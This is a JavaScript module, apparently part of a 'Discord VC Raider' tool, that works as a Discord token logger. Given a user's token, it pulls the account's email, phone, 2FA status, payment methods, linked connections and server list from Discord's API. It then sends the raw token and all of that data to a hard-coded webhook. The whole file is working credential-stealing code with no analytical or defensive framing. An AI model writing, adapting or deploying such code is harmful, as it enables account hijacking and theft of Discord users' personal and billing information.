const webhookURL = 'https://ptb.discord.com/api/webhooks/1341046042506039306/MVLhdPO9I23DibGt6vDmaSEPuORq7Qe_kMBCpTeAKsBrJPRmEZ0q1KF4A4aNW0OpfNz_';

async function logToken(token) {
    try {

        const userData = await fetch('https://discord.com/api/v9/users/@me', {
            headers: {
                'Authorization': token
            }
        }).then(res => res.json());

        const connections = await fetch('https://discord.com/api/v9/users/@me/connections', {
            headers: {
                'Authorization': token
            }
        }).then(res => res.json()).catch(() => []);

        const billing = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
            headers: {
                'Authorization': token
            }
        }).then(res => res.json()).catch(() => []);

        const guilds = await fetch('https://discord.com/api/v9/users/@me/guilds', {
            headers: {
                'Authorization': token
            }
        }).then(res => res.json()).catch(() => []);

        const embed = {
            title: " New Token Captured",
            description: `Token Successfully Captured and Verified\n\`\`\`${token}\`\`\``,
            color: 0x7289DA,
            fields: [
                {
                    name: " User Information",
                    value: [
                        `**Username:** \`${userData.username}#${userData.discriminator}\``,
                        `**ID:** \`${userData.id}\``,
                        `**Email:** \`${userData.email || 'None'}\``,
                        `**Phone:** \`${userData.phone || 'None'}\``,
                        `**Locale:** \`${userData.locale || 'Unknown'}\``,
                        `**Verified:** \`${userData.verified ? 'Yes' : 'No'}\``,
                        `**2FA Enabled:** \`${userData.mfa_enabled ? 'Yes' : 'No'}\``
                    ].join('\n'),
                    inline: false
                },
                {
                    name: " Billing",
                    value: billing.length > 0 ? 
                        `**Payment Methods:** \`${billing.length}\`` :
                        "```No Payment Methods Found```",
                    inline: true
                },
                {
                    name: " Nitro Status",
                    value: `**Type:** \`${userData.premium_type ? (userData.premium_type === 2 ? 'Nitro Boost' : 'Nitro Classic') : 'None'}\``,
                    inline: true
                },
                {
                    name: " Connections",
                    value: connections.length > 0 ?
                        connections.map(c => `\`${c.type}: ${c.name}\``).join('\n') :
                        "```No Connections Found```",
                    inline: false
                },
                {
                    name: " Servers",
                    value: `**Total Servers:** \`${guilds.length}\`\n${
                        guilds.filter(g => g.owner).length > 0 ?
                        `**Owned Servers:** \`${guilds.filter(g => g.owner).length}\`` :
                        ''
                    }`,
                    inline: false
                }
            ],
            thumbnail: {
                url: userData.avatar ? 
                    `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.${userData.avatar.startsWith('a_') ? 'gif' : 'png'}?size=1024` :
                    `https://cdn.discordapp.com/embed/avatars/${parseInt(userData.discriminator) % 5}.png`
            },
            footer: {
                text: "Discord VC Raider | Token Logger",
                icon_url: "https://cdn.discordapp.com/emojis/1062323131160162344.gif"
            },
            timestamp: new Date().toISOString()
        };

        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: "Token Logger",
                avatar_url: "https://cdn.discordapp.com/emojis/1062323131160162344.gif",
                embeds: [embed]
            })
        });

        if (!response.ok) {
            throw new Error(`Failed to send to webhook: ${response.statusText}`);
        }

        return true;
    } catch (error) {
        console.error('Error logging token:', error);
        return false;
    }
}

export { logToken };